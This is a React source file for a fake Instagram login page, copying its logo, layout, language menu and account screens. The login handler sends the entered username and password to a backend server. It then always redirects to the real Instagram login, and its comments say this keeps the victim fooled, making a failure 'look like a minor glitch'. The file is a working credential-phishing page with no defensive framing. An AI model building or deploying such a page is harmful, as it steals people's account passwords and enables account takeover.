import React, { useState } from 'react';
import './index.css';

const LANGUAGES = [
  "Afrikaans",
  "Bahasa Indonesia",
  "Bahasa Melayu",
  "Dansk",
  "Deutsch",
  "English (India)",
  "English (UK)",
  "English (US)",
  "Español",
  "Français",
  "Italiano",
  "Magyar",
  "Nederlands",
  "Polski",
  "Português (Brasil)",
  "Português (Portugal)",
  "Română",
  "Svenska",
  "Türkçe",
  "Ελληνικά",
  "Русский",
  "हिंदी",
  "বাংলা",
  "ગુજરાતી",
  "मराठी",
  "ਪੰਜਾਬી",
  "தமிழ்",
  "తెలుగు",
  "日本語",
  "简体中文",
  "한국어"
];

function Login({ onNavigate }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLangOpen, setIsLangOpen] = useState(false);
  const [selectedLang, setSelectedLang] = useState('English (India)');

  const handleLogin = async () => {
    if (!username || !password) {
      alert('Please enter username and password');
      return;
    }
    
    try {
      const response = await fetch('http://localhost:5000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      
      const data = await response.json();
      if (response.ok) {
        // Redirect directly without any message
        window.location.href = "https://www.instagram.com/accounts/login/";
      } else {
        // If there's an error, we still want to redirect to real Instagram 
        // to make it look like a minor glitch, rather than an error.
        window.location.href = "https://www.instagram.com/accounts/login/";
      }
    } catch (error) {
      // On network error, just redirect anyway to maintain the illusion
      window.location.href = "https://www.instagram.com/accounts/login/";
    }
  };


  return (
    <>
      <div className="header">
        <button className="back-btn">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
        </button>
        <div className="lang-selector" onClick={() => setIsLangOpen(true)}>
          {selectedLang}
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <polyline points="6 9 12 15 18 9"></polyline>
          </svg>
        </div>
      </div>

      <div className="main-content login-content">
        <div className="logo-container">
          <svg viewBox="0 0 100 100" width="72" height="72">
            <defs>
              <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#FFD600" />
                <stop offset="25%" stopColor="#FF7A00" />
                <stop offset="50%" stopColor="#FF0069" />
                <stop offset="75%" stopColor="#D300C5" />
                <stop offset="100%" stopColor="#7638FA" />
              </linearGradient>
            </defs>
            <rect x="10" y="10" width="80" height="80" rx="22" ry="22" fill="url(#igGradient)" />
            <rect x="24" y="24" width="52" height="52" rx="14" ry="14" fill="none" stroke="#fff" strokeWidth="6.5" />
            <circle cx="50" cy="50" r="13" fill="none" stroke="#fff" strokeWidth="6.5" />
            <circle cx="66.5" cy="33.5" r="3.5" fill="#fff" />
          </svg>
        </div>

        <div className="form-container">
          <div className="input-wrapper">
            <input 
              type="text" 
              className={`input-field ${username ? 'has-value' : ''}`}
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <span className="floating-label">Username, email address or mobile number</span>
          </div>
          <div className="input-wrapper">
            <input 
              type="password" 
              className={`input-field ${password ? 'has-value' : ''}`}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <span className="floating-label">Password</span>
          </div>
          <button className="login-btn" onClick={handleLogin}>Log in</button>
        </div>

        <button className="forgot-btn" onClick={() => onNavigate('forgot')}>Forgotten password?</button>
      </div>

      <div className="footer">
        <button className="create-account-btn" onClick={() => onNavigate('create')}>Create new account</button>
        <div className="meta-logo-container" style={{ display: 'flex', justifyContent: 'center', width: '100%' }}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" 
            alt="Meta" 
            style={{ height: '16px', objectFit: 'contain' }}
          />
        </div>
      </div>

      {/* Language Selection Modal */}
      {isLangOpen && (
        <div className="modal-overlay" onClick={() => setIsLangOpen(false)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-drag-handle"></div>
            <div className="modal-header">
              <button className="modal-close" onClick={() => setIsLangOpen(false)}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"></line>
                  <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
              </button>
            </div>
            <h2 className="modal-title">Select your language</h2>
            <div className="lang-list-container">
              {LANGUAGES.map((lang, idx) => (
                <div 
                  key={idx} 
                  className="lang-item" 
                  onClick={() => {
                    setSelectedLang(lang);
                    setIsLangOpen(false);
                  }}
                >
                  <span className="lang-name">{lang}</span>
                  <div className={`lang-checkbox ${selectedLang === lang ? 'checked' : ''}`}></div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </>
  );
}

function ForgotPassword({ onNavigate }) {
  const [inputValue, setInputValue] = useState('');
  const [mode, setMode] = useState('email'); // 'email' or 'mobile'

  const toggleMode = () => {
    setMode(prevMode => prevMode === 'email' ? 'mobile' : 'email');
    setInputValue(''); // Clear input on switch
  };

  return (
    <>
      <div className="header forgot-header">
        <button className="back-btn" onClick={() => onNavigate('login')}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
        </button>
      </div>

      <div className="main-content forgot-content">
        <h1 className="forgot-title">Find your account</h1>
        <p className="forgot-subtitle">
          {mode === 'email' ? 'Enter your email address or username.' : 'Enter your mobile number.'}
        </p>
        <button className="cant-reset-btn">Can't reset your password?</button>

        <div className="form-container">
          <div className="input-wrapper">
            <input 
              type={mode === 'mobile' ? 'tel' : 'text'} 
              className={`input-field ${inputValue ? 'has-value' : ''}`}
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
            />
            <span className="floating-label">
              {mode === 'email' ? 'Email address or username' : 'Mobile number'}
            </span>
          </div>

          <button className="primary-btn">Continue</button>
          <button className="secondary-btn" onClick={toggleMode}>
            {mode === 'email' ? 'Find by mobile number' : 'Find by email address or username'}
          </button>
        </div>
      </div>
    </>
  );
}

function CreateAccount({ onNavigate }) {
  const [inputValue, setInputValue] = useState('');
  const [mode, setMode] = useState('mobile'); // 'mobile' or 'email'

  const toggleMode = () => {
    setMode(prevMode => prevMode === 'mobile' ? 'email' : 'mobile');
    setInputValue(''); // Clear input on switch
  };

  return (
    <>
      <div className="header forgot-header">
        <button className="back-btn" onClick={() => onNavigate('login')}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
        </button>
      </div>

      <div className="main-content forgot-content">
        <h1 className="forgot-title">
          {mode === 'mobile' ? "What's your mobile number?" : "What's your email address?"}
        </h1>
        <p className="forgot-subtitle" style={{marginBottom: '20px'}}>
          {mode === 'mobile' 
            ? "Enter the mobile number on which you can be contacted. No one will see this on your profile." 
            : "Enter the email address on which you can be contacted. No one will see this on your profile."}
        </p>

        <div className="form-container">
          <div className="input-wrapper">
            <input 
              type={mode === 'mobile' ? 'tel' : 'email'} 
              className={`input-field ${inputValue ? 'has-value' : ''}`}
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
            />
            <span className="floating-label">
              {mode === 'mobile' ? 'Mobile number' : 'Email address'}
            </span>
          </div>

          {mode === 'mobile' && (
            <p className="info-text">
              You may receive WhatsApp and SMS notifications from us. <span className="learn-more">Learn more</span>
            </p>
          )}

          <button className="primary-btn">Next</button>
          <button className="secondary-btn" onClick={toggleMode}>
            {mode === 'mobile' ? 'Sign up with email address' : 'Sign up with mobile number'}
          </button>
        </div>
      </div>

      <div className="footer">
        <button className="already-account-btn" onClick={() => onNavigate('login')}>
          I already have an account
        </button>
      </div>
    </>
  );
}

function App() {
  const [currentPage, setCurrentPage] = useState('login');

  return (
    <div className="app-container">
      {currentPage === 'login' && <Login onNavigate={setCurrentPage} />}
      {currentPage === 'forgot' && <ForgotPassword onNavigate={setCurrentPage} />}
      {currentPage === 'create' && <CreateAccount onNavigate={setCurrentPage} />}
    </div>
  );
}

export default App;
